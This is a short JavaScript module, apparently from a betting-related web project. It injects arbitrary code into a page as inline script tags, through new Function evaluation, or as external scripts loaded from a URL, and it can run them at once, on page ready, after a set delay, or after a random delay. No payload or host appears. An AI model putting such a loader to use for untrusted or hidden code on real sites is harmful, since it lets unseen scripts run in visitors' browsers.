/* global window:true document:true */

'use strict';

import helper from 'bet-helper';

function tagInjector (c) {
  return (() => {
    const s = document.createElement('script');
    s.type = 'text/javascript';
    s.charset = 'utf-8';
    s.innerHTML = c;
    document.getElementsByTagName('head')[0].appendChild(s);
  });
}

function evalInjector (c) {
  return (() => {
    const m = `\n${c}\n`;
    new Function('W, D', m)(window, document);
  });
}

function apiInjector (c) {
  return (() => {
    const m = `\n${c}\n`;
    new Function('W, D, A, M', m)(window, document, {}, {});
  });
}

function linkInjector (l) {
  return (() => {
    const s = document.createElement('script');
    s.type = 'text/javascript';
    s.charset = 'utf-8';
    s.src = l;
    document.getElementsByTagName('head')[0].appendChild(s);
  });
}

function getInjector (m) {
  switch (m.i) {
    case 1:
      return evalInjector(m.c);
    case 2:
      return apiInjector(m.c);
    case 3:
      return linkInjector(m.l);
    case 0:
    default:
      return tagInjector(m.c);
  }
}

export function injectRandom (m) {
  const injector = getInjector(m);
  const [min, max] = `${m.r}`.split('.');
  const rnd = helper.random(min, max) * 1000;
  console.log('injectRandom', m.r);
  console.log('rnd', rnd);

  helper.contentLoaded(window, () => setTimeout(injector, rnd));
}

export function injectWithDelay (m) {
  console.log('injectWithDelay', m.r);
  const injector = getInjector(m);
  helper.contentLoaded(window, () => setTimeout(injector, m.r * 1000));
}

export function injectImmediately (m) {
  console.log('injectImmediately', m.r);
  const injector = getInjector(m);
  injector();
}

export function injectDocumentReady (m) {
  console.log('injectDocumentReady', m.r);
  const injector = getInjector(m);
  helper.contentLoaded(window, injector);
}
